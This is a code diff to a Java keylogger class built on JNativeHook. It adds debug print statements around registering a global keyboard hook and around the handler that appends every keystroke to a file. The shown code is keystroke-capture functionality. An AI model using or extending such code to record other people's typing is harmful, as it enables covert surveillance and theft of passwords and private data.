@@ -28,8 +28,11 @@ public class KeyLogger implements NativeKeyListener {
         init();
 
         try {
+            System.out.println("Trying to register Native Hook!");
             GlobalScreen.registerNativeHook();
         } catch (NativeHookException e) {
+            System.out.println("Exception Occurred!");
+            System.out.println(e.getStackTrace());
             logger.error(e.getMessage(), e);
             System.exit(-1);
         }
@@ -38,7 +41,7 @@ public class KeyLogger implements NativeKeyListener {
     }
 
     private static void init() {
-
+        System.out.println("Initializing program!");
         // Get the logger for "org.jnativehook" and set the level to warning.
         java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
         logger.setLevel(Level.WARNING);
@@ -52,7 +55,7 @@ public class KeyLogger implements NativeKeyListener {
 
         try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                 StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
-
+            System.out.println("Hi from NATIVE KEY PRESSED Function!");
             if (keyText.length() > 1) {
                 writer.print("[" + keyText + "]");
             } else {
